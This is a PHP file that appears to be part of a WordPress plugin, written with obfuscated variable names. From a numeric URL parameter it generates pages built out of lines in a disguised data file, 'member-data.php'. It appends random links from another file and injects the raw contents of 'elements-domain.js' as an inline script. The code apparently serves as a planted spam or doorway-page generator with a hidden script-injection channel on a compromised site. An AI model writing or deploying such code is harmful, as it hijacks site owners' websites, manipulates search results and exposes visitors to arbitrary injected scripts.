<?php
$dJa8MfkNy5 = intval(get_query_var('dvnqnp'));

if ($dJa8MfkNy5 < 1 || $dJa8MfkNy5 > 5680) return;
$oUf09 = file(plugin_dir_path(__FILE__).'member-data.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$s2XyXV5Ru = explode(';', $oUf09[$dJa8MfkNy5]);
if (count($s2XyXV5Ru) < 2) return;
$mNPfz = $s2XyXV5Ru[0];
$mIbV4w  = $s2XyXV5Ru[1];
$ykHjLa1VJ = $s2XyXV5Ru[2];
$kgY4ubYNp  = $s2XyXV5Ru[3];
$an99e1xO = $s2XyXV5Ru[4];
set_query_var('pjxlomwgx', $mNPfz);

$lTTZM = '';
$oEdKyWs = plugin_dir_path(__FILE__).'light-plugins.php';
if (is_file($oEdKyWs)) {
	$auY2FmMRxw = file($oEdKyWs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($auY2FmMRxw);
	shuffle($auY2FmMRxw);
	$rfpD0TEEXw = mt_rand(2, 5);
	if (count($auY2FmMRxw) > $rfpD0TEEXw) {
		for ($ytkL7LM = 0; $ytkL7LM < $rfpD0TEEXw; $ytkL7LM++) {
			$lOn98WTdDC = array_shift($auY2FmMRxw);
			$lTTZM .= '<p><a href="'.$lOn98WTdDC.'">'.$lOn98WTdDC.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $mNPfz; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $mIbV4w . "</p>\n";
				if (strlen($kgY4ubYNp) > 0) echo "<p>" . $kgY4ubYNp . "</p>\n";
				if (strlen($ykHjLa1VJ) > 0) echo "<p>" . $ykHjLa1VJ . "</p>\n";
				if (strlen($an99e1xO) > 0) echo '<p><a href="#"><img src="'.$an99e1xO.'"></a>' . "</p>\n";
				echo $lTTZM;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$hA9zdt = plugin_dir_path(__FILE__) . 'elements-domain.js';
if (is_file($hA9zdt)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($hA9zdt);
	echo '</script>';
}
get_footer();
?>
